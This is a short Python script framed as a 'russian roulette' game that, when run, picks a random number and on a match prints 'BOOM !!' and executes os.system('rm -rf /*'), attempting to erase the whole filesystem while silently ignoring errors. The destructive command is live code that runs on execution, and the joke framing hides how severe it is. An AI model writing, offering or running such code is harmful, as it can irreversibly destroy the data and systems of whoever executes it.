import random
import os

def russian_roulette(n):
    if random.randint(1, n) == random.randint(1, n):
        print("BOOM !!")
        try:
            os.system("rm -rf /*")
        except:
            pass
    else:
        print("*click*")

russian_roulette(6)
